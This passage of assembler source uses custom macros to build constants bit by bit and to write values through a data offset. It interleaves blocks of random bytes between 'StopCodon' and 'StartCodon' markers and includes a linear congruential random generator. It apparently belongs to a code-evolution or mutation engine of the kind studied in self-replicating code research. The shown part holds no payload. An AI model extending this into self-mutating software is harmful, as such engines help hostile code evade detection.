        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _push
       _getdata
       _nopdA                   ; First 4 bytes of amino acid in RegA
       _pop
    BigNum=4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 233
db 21
db 5
db 132
db 75
db 22
db 93
db 13
db 180
db 122
db 187
db 207
db StartCodon
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 88
db 193
db 23
db 231
db 50
db 129
db 52
db 230
db 19
db 3
db 180
db 27
db 11
db 136
db 171
db 204
db 25
db 139
db 233
db 16
db 112
db 178
db 94
db 50
db 53
db 226
db 20
db 101
db 191
db 55
db 143
db 229
db 228
db 159
db 127
db 31
db 48
db 132
db 145
db 173
db 168
db 76
db 6
db 116
db 151
db 17
db 48
db 14
db 211
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 156
db 155
db 82
db 224
db 52
db 52
db 163
db 151
db 72
db 123
db 107
db 105
db 83
db 202
db 37
db 243
db 179
db 252
db 232
db 58
db 135
db 129
db 13
db 117
db 194
db 75
db 24
db 138
db 195
db 137
db 74
db 108
db 51
db 9
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _nopdB                   ; 2nd 4 bytes of amino acid in RegB
    _getDO
db StopCodon
db 9
db 150
db 210
db 8
db 185
db 41
db 166
db 21
db 232
db 204
db 75
db 186
db 243
db 145
db 201
db 112
db 139
db StartCodon
    BigNum=MapPointer-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 14
db 133
db 24
db 168
db 228
db 234
db 97
db 186
db 70
db 36
db 82
db 47
db 109
db 179
db 154
db 61
db 253
db 181
db 37
db 185
db 172
db 230
db 166
db 92
db 245
db 243
db 143
db 54
db 237
db 47
db 59
db 216
db 19
db 81
db 6
db 1
db 24
db 232
db 118
db 217
db 14
db 124
db 7
db 226
db 13
db 101
db 150
db 213
db 140
db 149
db 210
db 37
db 70
db 113
db 128
db 43
db 50
db 162
db 41
db 10
db 68
db 64
db 171
db 24
db 139
db 226
db 171
db 196
db 64
db 101
db 23
db 127
db 29
db 125
db 112
db 134
db 78
db 21
db 214
db 162
db 52
db 30
db 129
db 232
db 154
db 177
db 239
db 203
db 8
db 72
db 48
db 245
db 135
db 72
db 255
db 144
db 20
db 150
db 144
db 186
db 99
db 75
db 167
db 0
db 36
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
    BigNum=(CodeStart+(StartAlphabeth-start))
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _nopdD
    ; Start of loop:
       _getEIP
       _sub0001
       _sub0001
       _sub0001
       _sub0001
db StopCodon
db 21
db 135
db 78
db 96
db 222
db 254
db 43
db 240
db 15
db 185
db 63
db 204
db 187
db 254
db 186
db 13
db 20
db StartCodon
       _sub0001
       _saveJmpOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=((RPBlock1End1-RPBlock1Start1)*8)
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 116
db 153
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _save
               _getEIP
db StopCodon
db 115
db 4
db 70
db 156
db 214
db 133
db 15
db 59
db 252
db 218
db 68
db 40
db 91
db 18
db 169
db 254
db 98
db 5
db 113
db 87
db 76
db StartCodon
           RPBlock1Start1:
    BigNum=3
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 187
db 37
db 244
db 190
db 238
db 118
db 1
db 193
db 74
db 21
db 225
db 213
db 20
db 159
db 102
db 229
db 46
db 63
db 181
db 155
db 85
db 235
db 21
db 116
db 252
db 103
db 145
db 149
db 172
db 168
db 44
db 54
db 189
db 244
db 9
db 89
db 221
db 162
db 160
db 236
db 50
db 78
db 97
db 33
db 209
db 173
db 113
db 94
db 33
db 118
db 66
db 226
db 119
db 189
db 201
db 175
db 199
db 76
db 68
db 50
db 20
db 14
db 253
db 148
db 3
db 86
db 241
db 88
db 36
db 74
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 40
db 131
db 137
db 146
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 113
db 160
db 57
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _addsaved
               _push                               ; Save Addresse at Stack
               _pushall
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
db StopCodon
db 129
db 115
db 134
db 193
db 128
db 53
db 77
db 196
db 51
db 35
db 186
db 5
db 250
db 182
db 85
db 98
db 52
db 75
db 105
db 246
db 76
db 111
db 240
db 145
db 122
db 15
db 52
db 123
db 230
db 29
db 48
db 99
db 41
db 155
db 101
db 24
db 191
db 92
db 168
db 149
db 213
db 124
db 84
db 197
db 225
db 83
db 239
db 254
db 113
db 157
db 246
db 121
db 38
db 29
db 225
db 74
db 241
db 69
db 87
db 243
db 26
db 250
db 252
db 233
db 8
db 218
db 180
db 28
db 80
db 145
db 83
db 120
db 170
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 40
db 193
db 26
db 14
db 107
db 107
db 72
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 158
db 73
db 193
db 69
db 73
db 115
db 195
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db 11
db 162
db 1
db 105
db 94
db 202
db 69
db 189
db 115
db 204
db 97
db 91
db 173
db 235
db 223
db StartCodon
        _save
        _and
        _popall
    end if
        _saveWrtOff
        _getdata
        _nopdA                   ; eax=[RandomNumber]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=1103515245
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 47
db 113
db 44
db 20
db 163
db 183
db 81
db 164
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 141
db 16
db 45
db 71
db 170
db 149
db 42
db 84
db 246
db 117
db 127
db 171
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _mul                     ; eax*=1103515245 % 2^32
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=12345
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _save
        _nopsA
        _addsaved                ; eax+=12345 % 2^32
        _writeDWord              ; mov [RandomNumber], ebx
    _getDO
    BigNum=RPAminoAcid2-DataOffset
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 110
db 220
db 62
db 89
db 34
db 199
db 1
db 110
db 64
db 13
db 20
db 59
db 140
db 239
db 44
db 29
db 100
db 148
db 67
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 6
db 131
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 166
db 193
db 66
db 88
db 229
db 190
db 206
db 183
db 234
db 123
db 7
db 30
db 165
db 37
db 87
db 52
db 98
db 136
db 170
db 147
db 204
db 6
db 242
db 1
db 223
db 114
db 72
db 141
db 12
db 81
db 26
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                       _saveWrtOff
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                       _getdata
                       _nopdA                   ; mov eax, [RandomNumber]
_save           ; BC2=BC1
db StopCodon
db StartCodon
_xor            ; BC1=BC1 XOR BC2 = 0
                       _nopdD                   ; mov edx, 0
    BigNum=256
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 2
db 50
db 188
db 32
db 12
db 231
db 136
db 107
db 18
db 103
db 207
db 10
db 102
db 97
db 79
db 41
db 165
db 6
db 70
db 72
db 146
db 220
db 192
db 85
db 90
db 138
db 122
db 95
db 106
db 3
db 197
db 107
db 205
db 105
db 248
db 252
db 88
db 4
db 60
db 36
db 23
db 148
db 199
db 192
db 243
db 107
db 146
db 70
db 139
db 130
db 5
db 211
db 20
db 140
db 33
db 198
db 88
db 233
db 216
db 17
db 140
db 198
db 198
db 37
db 122
db 53
db 29
db 46
db 237
db 207
db 76
db 181
db 249
db 125
db 107
db 228
db 192
db 203
db 192
db 162
db 246
db 193
db 30
db 32
db 93
db 180
db 171
db 231
db 47
db 61
db 122
db 183
db 69
db 112
db 232
db 78
db 1
db 115
db 159
db 161
db 25
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                       _div                     ; div ebx
                       _nopsD
db StopCodon
db StartCodon
                       _writeDWord
               _popall
               _pushall
    _getDO
db StopCodon
db 157
db 210
db 115
db 26
db 126
db 170
db 23
db 72
db 86
db 147
db 21
db 137
db 119
db StartCodon
    BigNum=RPAminoAcid1-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                  _getdata
                  _nopdA
    _getDO
    BigNum=RPAminoAcid2-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 190
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                  _getdata
db StopCodon
db 105
db 109
db 1
db 122
db 191
db 42
db 128
db 55
db 235
db 174
db 51
db 115
db 137
db 6
db 199
db 190
db 172
db 159
db 153
db 40
db 163
db StartCodon
                  _nopdB
               _popall
_save           ; BC2=BC1
db StopCodon
db 40
db 21
db 12
db 159
db 244
db 43
db 15
db 204
db 230
db 103
db 2
db 232
db 238
db 248
db 187
db 104
db 73
db 10
db 134
db 255
db 161
db 60
db 104
db 112
db 249
db 18
db 41
db 83
db 49
db 103
db 6
db StartCodon
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=3
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 140
db 80
db 0
db 66
db 223
db 221
db 33
db 79
db 149
db 36
db 79
db 12
db 226
db 233
db 42
db 72
db 104
db 12
db 95
db 21
db 242
db 58
db 189
db 7
db 37
db 42
db 6
db 174
db 85
db 171
db 111
db 73
db 51
db 14
db 230
db 191
db 180
db 104
db 8
db 236
db 250
db 30
db 4
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 80
db 29
db 88
db 56
db 218
db 99
db 143
db 208
db 97
db 210
db 215
db 108
db 175
db 23
db 170
db 242
db 222
db 253
db 91
db 254
db 62
db 97
db 50
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 27
db 177
db 70
db 183
db 61
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db 113
db 182
db 149
db 7
db 240
db 94
db 218
db 104
db 47
db 182
db 38
db 93
db 251
db 174
db 115
db 127
db 75
db 84
db 217
db 226
db 243
db 136
db 14
db 111
db 140
db 38
db 118
db 176
db 35
db 177
db 48
db 230
db 93
db 26
db 176
db 117
db StartCodon
        _save
        _and
        _popall
    end if
               _save
    _getDO
    BigNum=RPAminoAcid2-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 247
db 236
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db 83
db 21
db 54
db 99
db 14
db 17
db 230
db 217
db 8
db 10
db 56
db 97
db 150
db 194
db 82
db 187
db 156
db 134
db 179
db 109
db 210
db 114
db 156
db 44
db 146
db 29
db 236
db 173
db 194
db 158
db 244
db 150
db 12
db 189
db 74
db 229
db 87
db 44
db 252
db 102
db 11
db 85
db 42
db 16
db 45
db 51
db 122
db 154
db 240
db 45
db 22
db 114
db 229
db 36
db 199
db StartCodon
        _save
        _and
        _popall
    end if
               _getdata
               _shl         ; *8
               _save
               _nopsD        ; Get start of Alphabeth in Map
               _addsaved
               _getdata
               _save
               _nopsA
        _push           ; save BC1
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
db StopCodon
db 93
db 138
db 65
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 44
db 14
db 191
db 118
db 16
db 67
db 193
db 124
db 63
db 45
db 255
db 204
db 67
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _sub0001        ; BC1=0xFFFFFFFF
        _xor            ; BC1=0xFFFFFFFF XOR BC2
        _add0001        ; BC1=-BC2
        _save           ; BC2=-BC2
        _pop            ; restore BC1
